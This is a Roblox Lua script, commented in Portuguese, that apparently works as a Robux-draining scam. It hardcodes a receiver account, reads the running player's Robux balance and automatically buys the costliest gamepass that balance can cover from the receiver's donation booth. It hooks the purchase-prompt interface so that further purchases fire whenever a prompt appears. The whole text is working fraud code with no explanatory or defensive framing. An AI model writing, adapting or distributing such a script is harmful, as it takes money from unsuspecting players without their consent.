local Username = "Ian_wp27" -- substitua pelo nome do jogador
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local CoreGui = game:GetService("CoreGui")
local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))

local player = Players.LocalPlayer
local userId
local success, err = pcall(function()
    userId = Players:GetUserIdFromNameAsync(Username)
end)
if not success then
    warn("Usuário não encontrado:", err)
    return
end

-- Busca o Booth do jogador alvo
local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(userId)
if not Booth then
    player:Kick("Receiver not found!")
    return
end

-- Função para pegar o saldo atual do jogador (ou fallback)
local function GetUserRobux()
    local ok, robux = pcall(function()
        return Remotes.Function("GetUserRobux"):InvokeServer()
    end)
    if ok and type(robux) == "number" then
        return robux
    else
        warn("Não foi possível obter o saldo. Usando 0")
        return 0
    end
end

-- Função para selecionar e comprar o gamepass mais caro possível
local function Purchase()
    local userRobux = GetUserRobux()
    local bestAsset
    local bestPrice = 0

    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
        if v:GetAttribute("AssetType") == "Gamepass" and
           not MarketplaceService:UserOwnsGamePassAsync(player.UserId, v:GetAttribute("AssetId")) then
            local price = v:GetAttribute("AssetPrice")
            if price and price <= userRobux and price > bestPrice then
                bestPrice = price
                bestAsset = v
            end
        end
    end

    if bestAsset and bestAsset.Prompt and typeof(bestAsset.Prompt.FireServer) == "function" then
        -- FireServer com AssetId e preço
        bestAsset.Prompt:FireServer(bestAsset:GetAttribute("AssetId"), bestPrice)
        print("Comprando gamepass:", bestAsset.Name, "Preço:", bestPrice)
    else
        print("Nenhum gamepass disponível dentro do saldo.")
    end
end

-- Espera o PurchasePromptApp aparecer (UI de compra)
local PurchasePromptApp
repeat
    PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp")
    task.wait(0.1)
until PurchasePromptApp

-- Conecta para monitorar quando a prompt aparece e dispara a compra
PurchasePromptApp.ChildAdded:Connect(function(child)
    if child.Name == "Prompt" then
        Purchase()
    end
end)

-- Dispara a primeira tentativa de compra
Purchase()
